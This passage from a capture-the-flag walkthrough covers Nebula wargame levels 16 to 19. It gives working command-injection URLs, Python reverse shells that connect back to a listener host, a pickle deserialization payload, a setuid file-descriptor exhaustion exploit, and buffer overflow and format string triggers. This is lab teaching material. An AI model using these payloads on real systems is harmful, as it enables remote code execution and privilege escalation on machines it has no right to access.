root (also flag16 home dir). So how can we exploit this at all?

After some minutes of pure confusion, I tried to craft paths with bash wildcards. So I tried to execute a 
program in temp without using lower space chars. 

First I created a simple test script:

	:::bash
	level16@nebula:~$ cat /tmp/SLEEPY.SH 
	#!/bin/bash
	sleep 5

Then I created a short Python program to request the cgi script:

	:::python
	#!/usr/bin/python

	import urllib2
	from urllib import quote

	host = '192.168.56.101:1616'
	uri = 'http://{}/index.cgi?username={}&password={}'.format(host, quote('$(/*/SLEEPY.sh)', safe=''), '')

	request = urllib2.urlopen(uri)
	# should take at least 5 seconds if the code is executed
	print request.read()

It worked! The payload `/*/OURCODE.SH` will execute the program in the `/tmp/` directory. Now I created a simple
POC script:

	:::bash
	# create POC script 
	echo -e '#!/bin/bash\ngetflag > /tmp/gotflag' > /tmp/FLAG.SH
	chmod +x /tmp/FLAG.SH

And requested the url with the payload:

> http://192.168.56.101:1616/index.cgi?username=%24%28%2F%2A%2FFLAG.SH%29&password=

It worked!

	:::bash
	level16@nebula:~$ cat /tmp/gotflag 
	You have successfully executed getflag on a target account

To get a shell, start netcat on your host computer and create a reverse shell in the 
`/tmp` dir in the nebula host:

	:::
	# on host pc
	nc -l 192.168.56.1 8888

	# on nebula host
	level16@nebula:~$ cat /tmp/BD.PY 
	#!/usr/bin/python
	import socket,subprocess,os

	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("192.168.56.1",8888))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p=subprocess.call(["/bin/sh","-i"])
	level16@nebula:~$ chmod +x /tmp/BD.PY


And request the url with the payload:

> http://192.168.56.101:1616/index.cgi?username=%24%28%2F%2A%2FBD.PY%29&password=

Getting us a shell:

	:::bash
	sh-4.2$ id
	id
	uid=983(flag16) gid=983(flag16) groups=983(flag16)
	sh-4.2$ getflag
	getflag
	You have successfully executed getflag on a target account


Another approach would be to use case modifications in shell expansions:
[case modifications](http://wiki.bash-hackers.org/syntax/pe#case_modification)

## Level 17 - RCE with pickle

This level is quite similar to a previous level where we exploited `serialize()` in PHP.

Pickle is a simple object serialization algortihm that transforms Python objects to strings and vice versa.

But as the docs state, it is unsecure when the data comes from untrusted sources. In our case, the vulnerable server
looks like this:

	:::python
	#!/usr/bin/python

	import os
	import pickle
	import time
	import socket
	import signal

	signal.signal(signal.SIGCHLD, signal.SIG_IGN)

	def server(skt):
		line = skt.recv(1024)

		print 'Got line: "{}"'.format(line)

		obj = pickle.loads(line)

		for i in obj:
			clnt.send("why did you send me " + i + "?\n")

	skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
	skt.bind(('0.0.0.0', 10007))
	skt.listen(10)

	while True:
		clnt, addr = skt.accept()

		if(os.fork() == 0):
			clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
			server(clnt)
			exit(1)


The above program spawns a server and loads pickled data from the client data. This is unsecure, because
we can craft a pickled string that executes commands.

You can obtain the pickled string by executing the following code:

	:::python
	import os
	import pickle

	# Exploit that we want the target to unpickle
	class Exploit(object):
	    def __reduce__(self):
	        return (os.system, ('python /tmp/bd.py',))

	shellcode = pickle.dumps(Exploit())
	print shellcode

Then as always, create a connect back shell in `/tmp/bd.py` which might look like this (make it executable!):

	:::bash
	level17@nebula:/home/flag17$ cat /tmp/bd.py 
	#!/usr/bin/python
	import socket,subprocess,os

	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("localhost", 8888))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p=subprocess.call(["/bin/sh","-i"])


First open one terminal and enter the following command:

	:::bash
	level17@nebula:~$ nc -l localhost 8888


And in the second terminal we exploit the server by entering the following in a terminal:

	:::bash
	evel17@nebula:/home/flag17$ nc localhost 10007
	Accepted connection from 127.0.0.1:39122cposix
	system
	p0
	(S'python /tmp/bd.py'
	p1
	tp2
	Rp3
	.

And then in the first terminal we have a shell with user `flag17`. Done!


## Level 18 - Exhausting file descriptors to create circumstances

In this level, we neet to exploit a C Program that has the setuid bit set. The program has the following code:

	:::C
	#include <stdlib.h>
	#include <unistd.h>
	#include <string.h>
	#include <stdio.h>
	#include <sys/types.h>
	#include <fcntl.h>
	#include <getopt.h>


	struct {
	  FILE *debugfile;
	  int verbose;
	  int loggedin;
	} globals;

	#define dprintf(...) if(globals.debugfile) \
	  fprintf(globals.debugfile, __VA_ARGS__)
	#define dvprintf(num, ...) if(globals.debugfile && globals.verbose >= num) \
	  fprintf(globals.debugfile, __VA_ARGS__)

	#define PWFILE "/home/flag18/password"

	void login(char *pw)
	{
	  FILE *fp;

	  fp = fopen(PWFILE, "r");
	  if(fp) {
	    char file[64];

	    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
	      dprintf("Unable to read password file %s\n", PWFILE);
	      return;
	    }
	    fclose(fp);
	    if(strcmp(pw, file) != 0) return;    
	  }
	  dprintf("logged in successfully (with%s password file)\n", 
	    fp == NULL ? "out" : "");
	  
	  globals.loggedin = 1;

	}

	void notsupported(char *what)
	{
	  char *buffer = NULL;
	  asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
	  dprintf(what);
	  free(buffer);
	}

	void setuser(char *user)
	{
	  char msg[128];

	  sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
	  printf("%s\n", msg);

	}

	int main(int argc, char **argv, char **envp)
	{
	  char c;

	  while((c = getopt(argc, argv, "d:v")) != -1) {
	    switch(c) {
	      case 'd':
	        globals.debugfile = fopen(optarg, "w+");
	        if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
	        setvbuf(globals.debugfile, NULL, _IONBF, 0);
	        break;
	      case 'v':
	        globals.verbose++;
	        break;
	    }
	  }

	  dprintf("Starting up. Verbose level = %d\n", globals.verbose);

	  setresgid(getegid(), getegid(), getegid());
	  setresuid(geteuid(), geteuid(), geteuid());
	  
	  while(1) {
	    char line[256];
	    char *p, *q;

	    q = fgets(line, sizeof(line)-1, stdin);
	    if(q == NULL) break;
	    p = strchr(line, '\n'); if(p) *p = 0;
	    p = strchr(line, '\r'); if(p) *p = 0;

	    dvprintf(2, "got [%s] as input\n", line);

	    if(strncmp(line, "login", 5) == 0) {
	      dvprintf(3, "attempting to login\n");
	      login(line + 6);
	    } else if(strncmp(line, "logout", 6) == 0) {
	      globals.loggedin = 0;
	    } else if(strncmp(line, "shell", 5) == 0) {
	      dvprintf(3, "attempting to start shell\n");
	      if(globals.loggedin) {
	        execve("/bin/sh", argv, envp);
	        err(1, "unable to execve");
	      }
	      dprintf("Permission denied\n");
	    } else if(strncmp(line, "logout", 4) == 0) {
	      globals.loggedin = 0;
	    } else if(strncmp(line, "closelog", 8) == 0) {
	      if(globals.debugfile) fclose(globals.debugfile);
	      globals.debugfile = NULL;
	    } else if(strncmp(line, "site exec", 9) == 0) {
	      notsupported(line + 10);
	    } else if(strncmp(line, "setuser", 7) == 0) {
	      setuser(line + 8);
	    }
	  }

	  return 0;
	}

#### Trying with gdb

First I tried to debug the `./flag18` binary with `gdb` and overwrite the `globals.loggedin` global
such that it would spawn the shell upon entering `shell` to stdin. That did indeed work, but the shell
wasn't run with `flag18` privs, because gdb sets the uid/euid to the real user id instead of the effective user id.
This means that gdb drops by default set user id privs.

#### Trying to use the LD_PRELOAD trick

Then I tried to apply the LD_PRELOAD trick by overwriting `fopen()` to always return NULL, such that the `login()` function
would succed. I used the following code:

	:::C
	// Compile with:
	// gcc -Wall -fPIC -shared -o fopen.so fopen.c
	// Then:
	// LD_PRELOAD=fopen.so
	#include <stdio.h>

	FILE *fopen(const char *path, const char *mode) {
	    printf("Always failing fopen\n");
	    return NULL;
	}

But this approach is also doomed to fail, because the LD_PRELOAD trick doesn't work with setuid binaries. The loader
will only load libraries that have also the setuid bit set and can be found in standard locations as `/usr/lib/` and the like.

> For set-user-ID/set-group-ID ELF binaries, only libraries in the standard
> search directories that are also set-user-ID will be loaded.

#### Real, effective and the saved user id.

After not having success upon quick examination, it's time to review some of the first lines
in the code:

	:::C
	setresgid(getegid(), getegid(), getegid());
	setresuid(geteuid(), geteuid(), geteuid()); 

setresXid sets the real, effective and saved user/group id of the calling process. But what are these different 
user identifiers for?

+ effective user id (euid): Is used for access checks (like opening a file). Also used for files created. This represents
	the actual capabilities of the process.
+ real user id (ruid): The users id of the process owner. When there is no setuid/setgid bit set on the process, it's the same
	as the user who invoked the process.
+ saved user id (suid): Variable to keep track of the original user id. Used to lower privileges and remember them for later use.

So the above calls to `setresgid()` set all of this different id's to the same value: the effective user/group id.


#### The hard way - buffer overflow

There is a buffer overflow in the function `setuser()`. There the a buffer with length 128 is formatted
with unbound user input data:

	:::C
	char msg[128];

	sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);

To trigger the overrun, call it like this:

	:::bash
	python -c 'print "setuser " + 150 * "A"' | ./flag18 -vvvvv -d /tmp/dbg


#### Format string vulnearabilities

Then there is the function:

	:::C
	void notsupported(char *what)
	{
	  char *buffer = NULL;
	  asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
	  dprintf(what);
	  free(buffer);
	}

which can be used to exploit format string vulnearabilities. An example might be to enter the following
after having called flag18 with `./flag18 -vvvvv -d /dev/tty`:

	:::bash
	site exec %s%s%s%s%s%s%s%s%s
	got [site exec %s%s%s%s%s%s%s%s%s] as input
	�����F<~����F<����F<��Āu'�VH�B�����Bu��,��O�O�O�O�O�O�O�P�got [%s] as input
	,���--> [%s%s%s%s%s%s%s%s%s] is unsupported at this current time.


#### The solution

All of this attacks are either not feasable or are hard to mount (especially the memory corruption attacks).
So after having spent some hours on this level18, I couldn't come up with a solution and looked on 
other writeups in the internet, where I found the solution at <http://louisrli.github.io/blog/2012/08/17/nebula2/#.Vh-KfR93lhE>.

The idea is to make `fopen()` fail. I saw earlier that the `globals.loggedin = 1;` is outside of the if statement
and that it would be executed when `fopen()` fails. But it didn't occur to me that `fopen()` will fail after
there are no more file descriptors left and that we can *actually open file descriptors in ./flag18* by sending
enough **login foo** commands. Fist check the soft limit of maximum open fds:

	:::bash
	level18@nebula:/home/flag18$ ulimit -Sn
	1024

Then create a file with 1025 'login' commands followd by a 'closelog' and 'shell' command. The closelog
will free one more filedescriptor such that the `execvp()` syscall will succeed.

	:::bash
	python -c 'open("/home/level18/flood", "w").write("login foo\n"*1025 + "closelog\n" + "shell\n")'

Then exploit the `./flag18` binary:

	:::bash
	cat ~/flood | ./flag18 --init-file /foo -d /dev/tty -vvvvv

Because `execve("/bin/sh", argv, envp);` will call the shell with all args supplied here, we need
a argument which ignores them (the job of `--init-file`).

This will yield a shell and we are done!

#### Sidenote

Actually the code is misleading. In assumed that every fd will be closed in the `login()` function:

	:::C
	void login(char *pw)
	{
	  FILE *fp;

	  fp = fopen(PWFILE, "r");
	  if(fp) {
	    char file[64];

	    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
	      dprintf("Unable to read password file %s\n", PWFILE);
	      return;
	    }
	    fclose(fp);
	    if(strcmp(pw, file) != 0) return;    
	  }
	  dprintf("logged in successfully (with%s password file)\n", 
	    fp == NULL ? "out" : "");
	  
	  globals.loggedin = 1;

	}

Because if `fopen()` is opened and the contents are read, we immediately close it again. But apparantly
this doesn't somehow happen and the fds stay open. Why?

## Level 19 - Zombie Processes belong to init!

In level 19 we have a setuid C program that first creates a path to the `procfs` of its parent
process: `snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());`.

We need to achieve that `stat()` returns `st_uid == 0` for the created file. This is only possible if the
parent process /proc/pid directory is owned by the root user.

I didn't solve this level on my own and peeked at the solution at <>. The basic idea is to make use of 
the default behaviour of unix processes, that they are reassigned to the init process, when its parent process
exits before the child process stops. 

So the idea is to create a program that `forks`, wait's until the parent process dies (by calling `sleep`) and finally
calls the `/home/flag19/flag19` setuid binary with `execve()`.

	:::C
	#include <unistd.h>

	int main(int argc, char **argv, char **envp) {
	    int childPID = fork();
	    if(childPID >= 0) { // forked
	        if(childPID == 0) { // child
	            sleep(1);
	            setresuid(geteuid(),geteuid(),geteuid());
	            char *args[] = {"/bin/sh", "-c", "/bin/getflag", NULL};
	            execve("/home/flag19/flag19", args, envp);
	        }
	    }
	    return 0;
	}